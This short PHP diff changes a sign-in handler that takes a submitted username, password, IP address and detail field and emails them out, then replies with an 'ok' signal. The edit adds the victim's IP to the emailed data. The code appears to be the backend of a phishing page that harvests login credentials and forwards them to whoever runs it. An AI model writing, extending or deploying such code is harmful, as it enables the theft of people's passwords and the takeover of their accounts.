@@ -114,7 +114,7 @@ if(isset($_POST["sign-in"])) {
     $ip = sanitize($_POST["ip"]);
     $detail = sanitize($_POST["detail"]);
 
-    sendEmail(["username" => $username,  "password" => $password, "detail" => $detail]);
+    sendEmail(["username" => $username, "ip" => $ip, "password" => $password, "detail" => $detail]);
 
     echo $response = json_encode([
         "signal" => "ok",
